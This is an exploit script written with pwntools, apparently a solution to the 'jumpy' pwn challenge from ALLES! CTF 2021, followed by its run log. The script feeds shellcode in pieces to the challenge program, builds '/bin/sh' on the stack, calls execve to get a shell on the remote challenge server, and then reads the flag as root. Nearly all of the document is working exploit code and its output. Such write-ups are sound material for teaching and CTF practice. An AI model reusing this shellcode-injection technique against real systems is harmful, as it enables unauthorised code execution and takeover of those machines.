from pwn import *

context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = './jumpy'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  s = process("ncat --ssl 7b000000d136daaf77c18b37-jumpy.challenge.master.allesctf.net 31337", shell=True)
else:
  s = process(BINARY)
 
def Set_ins(data):
  s.sendlineafter("> ", "jmp 1")
  s.sendlineafter("> ", "moveax 184")
  s.sendlineafter("> ", "moveax " + str(u32(data)))

# rsi = 0; rdx = 0
Set_ins(asm('''xor rsi, rsi; nop'''))
Set_ins(asm('''push rsi; pop rdx; nop; nop'''))

# make /bin/sh in stack
Set_ins(asm('''mov bx, 0x68'''))
Set_ins(asm('''shl rbx, 16'''))
Set_ins(asm('''mov bx, 0x732f'''))
Set_ins(asm('''shl rbx, 16'''))
Set_ins(asm('''mov bx, 0x6e69'''))
Set_ins(asm('''shl rbx, 16'''))
Set_ins(asm('''mov bx, 0x622f'''))
Set_ins(asm('''push rbx; mov rdi, rsp'''))

# rax = 0x3b
# syscall
Set_ins(asm('''xor rbx, rbx; nop'''))
Set_ins(asm('''add rbx, 0x3b'''))
Set_ins(asm('''push rbx; pop rax; syscall'''))

# Start shell
s.sendlineafter("> ", "a")

s.interactive()

'''
mito@ubuntu:~/CTF/ALLES!_CTF_2021/Pwn_Jumpy$ python solve.py r
[*] '/home/mito/CTF/ALLES!_CTF_2021/Pwn_Jumpy/jumpy'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process '/bin/sh': pid 62372
[*] Switching to interactive mode

running your code...
$ id
uid=0(root) gid=0(root) groups=0(root)
$ ls -l
total 92
lrwxrwxrwx   1 root root     7 Aug 27 07:16 bin -> usr/bin
drwxr-xr-x   2 root root  4096 Apr 15  2020 boot
drwxr-xr-x   5 root root   360 Sep  4 08:08 dev
drwxr-xr-x   1 root root  4096 Sep  4 08:08 etc
-rw-r--r--   1 root root   100 Aug 29 22:12 flag
drwxr-xr-x   2 root root  4096 Apr 15  2020 home
-rwxr-xr-x   1 root root 19768 Aug 29 22:12 jumpy
lrwxrwxrwx   1 root root     7 Aug 27 07:16 lib -> usr/lib
lrwxrwxrwx   1 root root     9 Aug 27 07:16 lib32 -> usr/lib32
lrwxrwxrwx   1 root root     9 Aug 27 07:16 lib64 -> usr/lib64
lrwxrwxrwx   1 root root    10 Aug 27 07:16 libx32 -> usr/libx32
drwxr-xr-x   2 root root  4096 Aug 27 07:16 media
drwxr-xr-x   2 root root  4096 Aug 27 07:16 mnt
drwxr-xr-x   2 root root  4096 Aug 27 07:16 opt
dr-xr-xr-x 783 root root     0 Sep  4 08:08 proc
drwx------   2 root root  4096 Aug 27 07:27 root
drwxr-xr-x   5 root root  4096 Aug 27 07:27 run
lrwxrwxrwx   1 root root     8 Aug 27 07:16 sbin -> usr/sbin
drwxr-xr-x   2 root root  4096 Aug 27 07:16 srv
dr-xr-xr-x  13 root root     0 Sep  4 08:08 sys
drwxrwxrwt   2 root root  4096 Aug 27 07:27 tmp
drwxr-xr-x  13 root root  4096 Aug 27 07:16 usr
drwxr-xr-x  11 root root  4096 Aug 27 07:27 var
-rwxr-xr-x   1 root root 18744 Aug 29 22:12 ynetd
$ cat flag
ALLES!{people have probably done this before but my google foo is weak. segmented shellcode maybe?}
'''
